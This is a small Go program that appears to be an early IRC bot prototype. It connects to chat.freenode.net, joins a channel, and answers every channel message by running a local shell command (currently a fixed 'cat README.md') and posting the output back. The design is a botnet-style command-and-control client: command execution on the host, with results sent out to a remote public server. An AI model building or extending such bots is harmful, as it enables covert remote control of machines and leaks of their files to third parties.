package main

import (
	"log"
	"net"
	"fmt"
	"os/exec"
	// "io/ioutil"
	"strings"

	irc "gopkg.in/irc.v3"
	// uuid "github.com/segmentio/ksuid"
)

func main() {
	// nodeName := uuid.New().String()
	
	config := irc.ClientConfig{
		Nick: "Z",
		Pass: "password",
		User: "username",
		Name: "Full Name",
		Handler: irc.HandlerFunc(func(c *irc.Client, m *irc.Message) {
			if m.Command == "001" {
				c.Write("JOIN #yyyzzzxxx")
			} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
				c.WriteMessage(&irc.Message{
					Command: "PRIVMSG",
					Params: []string{
						m.Params[0],
						cmdExecutor("cat README.md"),
					},
				})
			}
		}),
	}

	go connectToServer("chat.freenode.net:6667", config)

	// hax
	fmt.Println("Whoa!"); select{}
}

func cmdExecutor(input string) string {
	cmd, params := splitParams(input)
	out, _ := exec.Command(cmd, params...).Output()

	return strings.ReplaceAll(string(out), "\n", " \\n ")
}

func connectToServer(ircServer string, clientConfig irc.ClientConfig) {
	conn, err := net.Dial("tcp", ircServer)
	if err != nil {
		log.Fatalln(err)
	}

	client := irc.NewClient(conn, clientConfig)
	err = client.Run()
	if err != nil {
		log.Fatalln(err)
	}
}

func splitParams(line string) (string, []string) {
	params := strings.Split(line, " ")
	cmd := params[0]
	
	copy(params[0:], params[1:])
	params[len(params)-1] = ""
	params = params[:len(params)-1]

	return cmd, params
}
